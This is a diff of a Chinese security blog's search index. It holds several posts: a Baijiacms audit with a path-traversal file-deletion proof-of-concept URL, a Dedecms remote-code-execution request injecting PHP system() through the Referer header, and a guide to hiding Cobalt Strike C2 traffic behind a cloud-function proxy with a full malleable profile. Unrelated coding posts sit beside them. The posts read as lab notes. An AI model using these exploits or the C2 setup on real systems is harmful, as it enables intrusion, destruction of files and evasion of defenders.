+<p>改完了后，把文件上传到服务器，因为我比较懒，整理一个内网穿透工具，在自己电脑上用phpstudy简单弄了一下</p>
+<p>搞完后</p>
+<p>在arduino中把代码上传到u盘中</p>
+<p>代码如下：</p>
+<p>之后编译，上传，在出现这个提示后，把badUSB插入电脑就好了，</p>
+<img src="1503868-20200819192911528-22768958.png" alt loading="lazy">
+
+<p> </p>
+<p> 之后可以在自己电脑上插入测试一下。</p>
 <p> </p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Baijiacms 代码审计</title>
+    <url>/2022/11/26/Baijiacms-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<h2 id="系统路由"><a href="#系统路由" class="headerlink" title="系统路由"></a>系统路由</h2><p>这个系统采用的路由大部分由两步组成，我暂且给他们命名为模块，文件</p>
+<h3 id="定位模块"><a href="#定位模块" class="headerlink" title="定位模块"></a>定位模块</h3><p>先总结，定位模块由请求参数 act 决定。比如下面的url。就会定位到manager模块下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;baijiacmsV4-4.1.4&#x2F;index.php?mod&#x3D;site&amp;act&#x3D;manager&amp;do&#x3D;database&amp;op&#x3D;delete</span><br></pre></td></tr></table></figure>
+
+
+
+<p>系统从index.php文件出发，进行一些关系不是很大的判断后。走到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;includes/baijiacms.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>然后在这个文件里，都是一些简单的过滤（htmlspecialchars），整理请求参数（$_GP = array_merge($_GET, $_POST, $_GP);），以及数据库信息，常用函数文件的包含等。<br>这几段代码要关注一下。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GP</span>[<span class="string">&#x27;m&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$modulename</span> = <span class="variable">$_GP</span>[<span class="string">&#x27;act&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$modulename</span> = <span class="variable">$_GP</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">………………</span><br><span class="line">………………</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="variable">$_CMS</span>[<span class="string">&#x27;module&#x27;</span>]=<span class="variable">$modulename</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里主要是从请求中提取m或者act参数。取作$modulename，也就是模块名字，模块就是系统目录下的system文件夹下的文件。可以看到模块文件都很统一，都是两个文件夹class和template，两个文件mobile.php和web.php。偶尔有几个模块会有addons.php和common.php。</p>
+<p><img src="image-20221126175943465.png" alt="image-20221126175943465"></p>
+<p>在确定了$modulename后。代码走到下面的runner.inc.php文件才开始路由。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> WEB_ROOT.<span class="string">&#x27;/includes/baijiacms/runner.inc.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>路由从第二个if判断开始。这个isaddons又出现了，判断是否是插件（没细看代码，从变量命名来判断的）。这里主要关注参数 $modulename和$file  ，代码会将$modulename拼接，定向到对应模块下的mobile.php 或web.php文件内。</p>
+<p><img src="image-20221126180243104.png" alt="image-20221126180243104"></p>
+<h3 id="定位文件"><a href="#定位文件" class="headerlink" title="定位文件"></a>定位文件</h3><p>先总结，定位模块由请求参数 do 决定。比如下面的url。就会定位到manager模块下的database.php文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;baijiacmsV4-4.1.4&#x2F;index.php?mod&#x3D;site&amp;act&#x3D;manager&amp;do&#x3D;database&amp;op&#x3D;delete</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接来到/includes/baijiacms/runner.inc.php 文件中。找到这一行代码，（可能会找到两处，没关系，看第二处就行，第一处应该是判断插件模块额外判断的）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method</span> = <span class="string">&#x27;do_&#x27;</span>.<span class="variable">$_GP</span>[<span class="string">&#x27;do&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>在这里代码会给$do加上一个”do_”。比如上例的do=database。就会变成do_database复制给$method</p>
+<p><img src="image-20221126181927429.png" alt="image-20221126181927429"></p>
+<p>在赋值，判断该方法存在后，就又把do_给去掉，拼接成文件名。跳到模块对应文件中了。</p>
+<p><img src="image-20221126182305948.png" alt="image-20221126182305948"></p>
+<p><img src="image-20221126182434549.png" alt="image-20221126182434549"></p>
+<p>这里$filephp=”manager/class/web/database.php”</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>见上篇</p>
+<h2 id="文件删除漏洞"><a href="#文件删除漏洞" class="headerlink" title="文件删除漏洞"></a>文件删除漏洞</h2><p>（事后发现已经被人挖到了。<a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25873">CVE-2020-25873<i class="fas fa-external-link-alt"></i></a>）</p>
+<p>漏洞点在system/manager/class/web/database.php文件中第253行的rmdirs($path . $d);</p>
+<p><img src="image-20221127012249402.png" alt="image-20221127012249402"></p>
+<p>首先需要访问首页的备份与还原，备份一次，因为初始状态下，/config/data_backup/文件夹是不存在的，如果不进行备份来创建该文件夹，后续在</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_dir(<span class="variable">$path</span> . <span class="variable">$d</span>)) </span><br></pre></td></tr></table></figure>
+
+<p>这里判断时会一直false。</p>
+<p>在rmdirs函数中，会递归删除传入的文件夹中<strong>所有文件</strong>。</p>
+<p><img src="image-20221127012832594.png" alt="image-20221127012832594"></p>
+<p>这里我在测试时，在/tmp目录下创建了一个test文件夹。在文件夹下创建了两个文件passwd和shadow。</p>
+<p><img src="image-20221127013041995.png" alt="image-20221127013041995"></p>
+<p>随后就可以开始构造payload。其中前面的act=manager&amp;do=database&amp;op=delete是为了使代码走到这里，id的值为../../../../../../../../../../../../../../tmp/test的base64编码</p>
+<p>POC: <a class="link" href="http://127.0.0.1/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=manager&amp;do=database&amp;op=delete&amp;id=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3Rlc3Q=">http://127.0.0.1/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=manager&amp;do=database&amp;op=delete&amp;id=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3Rlc3Q=<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="image-20221127013748784.png" alt="image-20221127013748784"></p>
+<p>遍历所有文件，拼接路径，随后使用unlink删除</p>
+<p><img src="image-20221127013819234.png" alt="image-20221127013819234"></p>
+<p><img src="image-20221127013847753.png" alt="image-20221127013847753"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>B站缓存剧集散乱，用python移动，重命名文件</title>
+    <url>/2020/03/05/B%E7%AB%99%E7%BC%93%E5%AD%98%E5%89%A7%E9%9B%86%E6%95%A3%E4%B9%B1%EF%BC%8C%E7%94%A8python%E7%A7%BB%E5%8A%A8%EF%BC%8C%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12423345.html">源地址：https://www.cnblogs.com/This-is-Y/p/12423345.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>使用python的shutil库</p>
+<p>移动</p>
+<p>shutil.move(要移动的文件位置，目标位置）</p>
+<p>复制</p>
+<p>shutil.copy(要移动的文件位置，目标位置）</p>
+<p>如shutil.move(r’E:\41942769\test\111.txt’, r’E:\41942769\test_2\222.txt’)</p>
+<p>(这里加在字符串前面的的r是为了防止 ‘&#39; 转义)</p>
+<p> </p>
+<p>这里是发现b站下载的视频如果有很多集，在文件夹中是如此显示的</p>
+<img src="1503868-20200305222945564-1240341573.png" alt>
+
+<img src="1503868-20200305222935760-32275974.png" alt>
+
+<p> </p>
+<p> <img src="1503868-20200305223031567-526662282.png" alt></p>
+<p> </p>
+<p> 每个视频文件在最后都是0.blv的格式，其他的一些json文件，xml文件是视频信息和弹幕信息。</p>
+<p>这里用了两个小脚本把视频都放在一起，并且把视频文件命名位在B站中看到的名字</p>
+<p>移动</p>
+<p>重命名</p>
+<p>这边在分集下的文件夹中的entry.json文件中找到视频名字，用json稍微操作一下就可以得到视频名字。</p>
+<p>最后结果是这样的</p>
+<img src="1503868-20200305223537903-184238024.png" alt>
+
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>C2隐藏</title>
+    <url>/2021/07/28/C2%E9%9A%90%E8%97%8F/</url>
+    <content><![CDATA[<p>参考：<a class="link" href="https://mp.weixin.qq.com/s/sEzUenuP6lKQVcrDK_sxAw">https://mp.weixin.qq.com/s/sEzUenuP6lKQVcrDK_sxAw<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="创建云函数"><a href="#创建云函数" class="headerlink" title="创建云函数"></a>创建云函数</h2><p><a class="link" href="https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default">https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default<i class="fas fa-external-link-alt"></i></a><br>新建，选自定义，事件函数，代码部署，python3.6<br>代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf8</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">   response = &#123;&#125;</span><br><span class="line">   path = <span class="literal">None</span></span><br><span class="line">   headers = <span class="literal">None</span></span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       C2=<span class="string">&#x27;你的vpsIP&#x27;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;path&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">           path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;headers&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">           headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;httpMethod&#x27;</span> <span class="keyword">in</span> event.keys() <span class="keyword">and</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">           resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">       <span class="keyword">else</span>:      </span><br><span class="line">           params=event[<span class="string">&#x27;queryString&#x27;</span>]</span><br><span class="line">           resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,params=params,verify=<span class="literal">False</span>)</span><br><span class="line">           <span class="built_in">print</span>(resp.headers)</span><br><span class="line">           <span class="built_in">print</span>(resp.content)</span><br><span class="line">       response=&#123;</span><br><span class="line">           <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">           <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">           <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">           <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">       <span class="built_in">print</span>(e)</span><br><span class="line">   <span class="keyword">finally</span>:</span><br><span class="line">       <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210728143619968.png" alt="image-20210728143619968"></p>
+<h2 id="配置触发器"><a href="#配置触发器" class="headerlink" title="配置触发器"></a>配置触发器</h2><p>进入函数，触发管理，创建触发器，触发方式选择API网关触发<br><img src="image-20210728143947251.png" alt="image-20210728143947251"><br><img src="image-20210728143817873.png" alt="image-20210728143817873"></p>
+<h2 id="配置API网关"><a href="#配置API网关" class="headerlink" title="配置API网关"></a>配置API网关</h2><p>配置完触发器后，点进去，编辑<br><img src="image-20210728144053969.png" alt="image-20210728144053969"><br>改一下路径就行了，保存，发布。<br><img src="image-20210728144140112.png" alt="image-20210728144140112"><br>再次点进去，旁边的公网域名就是等下CS创建监听器要用的域名<br><img src="image-20210728144300135.png" alt="image-20210728144300135"></p>
+<h2 id="C2profile"><a href="#C2profile" class="headerlink" title="C2profile"></a>C2profile</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sample_name &quot;t&quot;;</span><br><span class="line">set sleeptime &quot;3000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident&#x2F;5.0)&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;x&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nodejs&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    set uri_x86 &quot;&#x2F;vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;&#x2F;api&#x2F;y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION&#x3D;&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;octet-stream&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>保存，然后带着这个文件启动teamserver，<br>./teamserver IP password xxx.profile</p>
+<h2 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h2><p>如图</p>
+<p><img src="image-20210728145217125.png" alt="image-20210728145217125"></p>
+<p>创建的时候有几点要注意</p>
+<ol>
+<li>HTTP Hosts填写的时候，掐头去尾，把http:// 和后面的 :80删掉，</li>
+<li>由于腾讯云只给了80和443的所以创建的监听器端口也只能是80或443，一一对应</li>
+</ol>
+]]></content>
   </entry>
   <entry>
     <title>CCF_2020_09 python</title>
@@ -428,57 +459,26 @@
       </categories>
   </entry>
   <entry>
-    <title>Android studio新建一个activity</title>
-    <url>/2021/03/17/Android%20studio%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AAactivity/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14551779.html">源地址：https://www.cnblogs.com/This-is-Y/p/14551779.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><strong>1、</strong></p>
-<p>res-&gt;layout右键新建一个xml-&gt;layout xml file</p>
-<img src="1503868-20210317195835357-70993166.png" alt loading="lazy">
-
+    <title>CCF 202006-1 线性分类器 python</title>
+    <url>/2020/08/14/CCF%20202006-1%20%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB%E5%99%A8%20python/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13502978.html">源地址：https://www.cnblogs.com/This-is-Y/p/13502978.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>题目：</p>
+<p>　　线性分类器（line）<br>　　【题目描述】<br>　　考虑一个简单的二分类问题——将二维平面上的点分为A和B两类。<br>　　训练数据包含n个点，其中第i个点（1≤i≤n）可以表示为一个三元组（x,y,type），即该点的横坐标、纵坐标和类别。<br>　　在二维平面上，任意一条直线可以表示为 θ₀+θ₁x+θ₂y=0的形式，即由θ₀，θ₁，θ₂三个参数确定该直线，且满足θ₀，θ₁不同时为0。<br>　　基于这n个已知类别的点，我们想要在平面上找到一条直线作为一个线性分类器。具体来说，这条线要把训练数据中的A、B两类点完美分隔开来，即一侧只有A类点、另一侧只有B类点。这样，对于任意一个的未知类别的点，我们就可以根据它是位于直线的哪一侧来预测它的类别了。<br>　　在本题中我们仅需要处理m个如下查询：给定一条直线，判断它是否能将训练数据中的A、B两类点完美分开。<br>【输入格式】<br>　　从标准输入读入数据。输入共n+m+1行。<br>　　第一行包含用空格分隔的两个正整数n和m，分别表示点和查询的个数。<br>　　第二行到第n+1行依次输入n个点的信息。第i+1行（1≤i≤n）包含用空格分隔的三项x,y和type，分别表示第i个点的横、纵坐标和类别，其中坐标为整数、类别为一个大写英文字母A或B。<br>　　第n+2行到第n+m+1行依次输入m个查询。第j+n+1行（1≤j≤m）包含用空格分隔的三个整数θ₀,θ₁和θ₂，表示第j个查询中给定直线的三个参数。</p>
+<p>【输出格式】<br>　　输出到标准输出。<br>　　输出共m行，每行输出一个字符串。<br>　　第j行（1≤j≤m）输出的字符串对应第个查询的结果：如果给定直线可以完美分隔A、B两类点，则输出Yes；否则输出No。<br>【样例1输入】</p>
+<p>9 3<br>1 1 A<br>1 0 A<br>1 -1 A<br>2 2 B<br>2 3 B<br>0 1 A<br>3 1 B<br>1 3 B<br>2 0 A<br>0 2 -3<br>-3 0 2<br>-3 1 1</p>
+<p>【样例1输出】</p>
+<p>No</p>
+<p>No</p>
+<p>Yes</p>
 <p> </p>
-<p> 名字，布局</p>
-<img src="1503868-20210317195920797-142464714.png" alt loading="lazy">
-
+<p>代码，用的python，从别人那里扒过来的。已获得同意   </p>
+<p>再补一个我自己写的</p>
 <p> </p>
-<p> 然后随便写点东西到新建的xml文件中</p>
-<p> </p>
-<img src="1503868-20210317200228775-1982566868.png" alt loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> </p>
-<p><strong>2、</strong></p>
-<p>app-&gt;java-&gt;第一个 。右键-&gt;新建-&gt;java类</p>
-<img src="1503868-20210317200317728-1094209561.png" alt loading="lazy">
+<p>满分</p>
+<img src="1503868-20200814163333221-1435192584.png" alt loading="lazy">
 
 <p> </p>
 <p> </p>
-<p> <img src="1503868-20210317200419083-640819000.png" alt loading="lazy"></p>
-<p> </p>
-<p> </p>
-<p> 加入代码</p>
-<p> </p>
-<p> </p>
-<p> </p>
-<p><strong>3、</strong></p>
-<p>在app-&gt;manifest-&gt;AndroidManifest.xml文件中的&lt;application&gt;标签内添加一个新标签，注册这个activity</p>
-<p> </p>
-<p>name是新建的activity名字，后面的label、action android:name随意，自己记得就好了</p>
-<p> </p>
-<p>到这一步就已经建完了。配置一个按钮检测一下</p>
-<p> </p>
-<p>在Activity_Main.xml中新建一个按钮，</p>
-<p> </p>
-<p>在MainActivity.java中写onClick函数。不要写在onCreate函数里面了</p>
-<p> </p>
-<img src="1503868-20210317202726826-1982007743.png" alt loading="lazy">
-
-<p> </p>
-<p> 这里的switch用来获取按钮id，用来区分是按下的哪个按钮。后面的这两个东西（）就是之前在manifest文件中添加的&lt;action android:name=“”&gt;。编译器不会联想，要自己输入，区分大小写</p>
-<img src="1503868-20210317202835646-936331724.png" alt loading="lazy">
-
-<p> </p>
-<p> <img src="1503868-20210317202927158-140619376.png" alt loading="lazy"></p>
 <p> </p>
 ]]></content>
       <categories>
@@ -1782,30 +1782,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Dedecms预认证远程代码执行漏洞</title>
-    <url>/2021/10/12/Dedecms%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>参考：<a class="link" href="https://www.ddosi.org/dedecms-poc/#ShowMsg_%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">https://www.ddosi.org/dedecms-poc/#ShowMsg_%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E<i class="fas fa-external-link-alt"></i></a></p>
-<p>这个漏洞只影响5.8.1 预发布版本<br>下载链接：<a class="link" href="https://github.com/dedecms/DedeCMS/archive/refs/tags/v5.8.1.zip">https://github.com/dedecms/DedeCMS/archive/refs/tags/v5.8.1.zip<i class="fas fa-external-link-alt"></i></a></p>
-<p>验证版本：<a class="link" href="http://127.0.0.1/DedeCMS-5.8.1/data/admin/ver.txt">http://127.0.0.1/DedeCMS-5.8.1/data/admin/ver.txt<i class="fas fa-external-link-alt"></i></a><br><img src="image-20211012155400476.png" alt="image-20211012155400476"></p>
-<p>先看一下它的poc跟着走一下代码<br>POC：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;plus&#x2F;flink.php?dopost&#x3D;save&amp;c&#x3D;id HTTP&#x2F;1.1</span><br><span class="line">Host: target</span><br><span class="line">Referer: &lt;?php &quot;system&quot;($c);die;&#x2F;*</span><br></pre></td></tr></table></figure>
-<p>bp抓包，修改一下，传给phpstorm<br><img src="image-20211012162516995.png" alt="image-20211012162516995"></p>
-<p>跳到ShowMsg函数里面</p>
-<p><img src="image-20211012162614100.png" alt="image-20211012162614100"></p>
-<p>gourl传入的是-1<img src="image-20211012162722990.png" alt="image-20211012162722990"><br>所以这里会从HTTP_REFERER里获取gourl，POC这里是&lt;?php “system”($c);die;/*</p>
-<p>然后gourl会嵌入到$func变量里，$func变量又会拼接到$msg遍历里面，最后，由DedeTemplate()类里的LoadString()方法和Display()来处理$msg变量，接下来看LoadSting()和Display()</p>
-<p><img src="image-20211012163457451.png" alt="image-20211012163457451"><br><img src="image-20211012163517491.png" alt="image-20211012163517491"></p>
-<p>DedeTemplate()类在include/dedetemplate.class.php文件里，372行处是LoadString()函数，<br>函数把$this-&gt;sourceString设置为了传入的msg，然后cachedir值为/data/tplcache，然后在本地目录找到了这个文件，打开它，发现location这个地方还是&lt;?php “system”($c);die;/*</p>
-<p><img src="image-20211012165040497.png" alt="image-20211012165040497"></p>
-<p><img src="image-20211012164840863.png" alt="image-20211012164840863"></p>
-<p>继续看代码，走完$this-&gt;ParseTemplate();这一步，this-&gt;sourceString里的location还是<br>Referer:  &lt;?php “system”($c);die;/*。<br><img src="image-20211012165749148.png" alt="image-20211012165749148"></p>
-<p>然后走display，display里有一步WriteCach()，跟进</p>
-<p><img src="image-20211012165918492.png" alt="image-20211012165918492"></p>
-<p>进入到WriteCache()后，我这里的走向和参考博客里不一样，我这里if判断为false，直接跳出来了，但是不走if里面的代码，最后也能出来结果，有点迷惑，</p>
-<p><img src="image-20211012183403469.png" alt="image-20211012183403469"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>IMEWDBLD.exe ByPass360 下载文件</title>
     <url>/2021/07/09/IMEWDBLD-exe-ByPass360-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<p>参考：<a class="link" href="https://mp.weixin.qq.com/s/AvhN1iEqL_LcIU9mNwoFBg">https://mp.weixin.qq.com/s/AvhN1iEqL_LcIU9mNwoFBg<i class="fas fa-external-link-alt"></i></a></p>
@@ -2085,6 +2061,30 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       <categories>
         <category>cnblogs</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Dedecms预认证远程代码执行漏洞</title>
+    <url>/2021/10/12/Dedecms%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>参考：<a class="link" href="https://www.ddosi.org/dedecms-poc/#ShowMsg_%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">https://www.ddosi.org/dedecms-poc/#ShowMsg_%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E<i class="fas fa-external-link-alt"></i></a></p>
+<p>这个漏洞只影响5.8.1 预发布版本<br>下载链接：<a class="link" href="https://github.com/dedecms/DedeCMS/archive/refs/tags/v5.8.1.zip">https://github.com/dedecms/DedeCMS/archive/refs/tags/v5.8.1.zip<i class="fas fa-external-link-alt"></i></a></p>
+<p>验证版本：<a class="link" href="http://127.0.0.1/DedeCMS-5.8.1/data/admin/ver.txt">http://127.0.0.1/DedeCMS-5.8.1/data/admin/ver.txt<i class="fas fa-external-link-alt"></i></a><br><img src="image-20211012155400476.png" alt="image-20211012155400476"></p>
+<p>先看一下它的poc跟着走一下代码<br>POC：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;plus&#x2F;flink.php?dopost&#x3D;save&amp;c&#x3D;id HTTP&#x2F;1.1</span><br><span class="line">Host: target</span><br><span class="line">Referer: &lt;?php &quot;system&quot;($c);die;&#x2F;*</span><br></pre></td></tr></table></figure>
+<p>bp抓包，修改一下，传给phpstorm<br><img src="image-20211012162516995.png" alt="image-20211012162516995"></p>
+<p>跳到ShowMsg函数里面</p>
+<p><img src="image-20211012162614100.png" alt="image-20211012162614100"></p>
+<p>gourl传入的是-1<img src="image-20211012162722990.png" alt="image-20211012162722990"><br>所以这里会从HTTP_REFERER里获取gourl，POC这里是&lt;?php “system”($c);die;/*</p>
+<p>然后gourl会嵌入到$func变量里，$func变量又会拼接到$msg遍历里面，最后，由DedeTemplate()类里的LoadString()方法和Display()来处理$msg变量，接下来看LoadSting()和Display()</p>
+<p><img src="image-20211012163457451.png" alt="image-20211012163457451"><br><img src="image-20211012163517491.png" alt="image-20211012163517491"></p>
+<p>DedeTemplate()类在include/dedetemplate.class.php文件里，372行处是LoadString()函数，<br>函数把$this-&gt;sourceString设置为了传入的msg，然后cachedir值为/data/tplcache，然后在本地目录找到了这个文件，打开它，发现location这个地方还是&lt;?php “system”($c);die;/*</p>
+<p><img src="image-20211012165040497.png" alt="image-20211012165040497"></p>
+<p><img src="image-20211012164840863.png" alt="image-20211012164840863"></p>
+<p>继续看代码，走完$this-&gt;ParseTemplate();这一步，this-&gt;sourceString里的location还是<br>Referer:  &lt;?php “system”($c);die;/*。<br><img src="image-20211012165749148.png" alt="image-20211012165749148"></p>
+<p>然后走display，display里有一步WriteCach()，跟进</p>
+<p><img src="image-20211012165918492.png" alt="image-20211012165918492"></p>
+<p>进入到WriteCache()后，我这里的走向和参考博客里不一样，我这里if判断为false，直接跳出来了，但是不走if里面的代码，最后也能出来结果，有点迷惑，</p>
+<p><img src="image-20211012183403469.png" alt="image-20211012183403469"></p>
+]]></content>
   </entry>
   <entry>
     <title>OWASP Top10</title>
@@ -2582,7 +2582,7 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p> </p>
 <p> </p>
 <p>也可以用kalissh远程登陆（推荐用这个，vmbox太tm蛋疼了）</p>
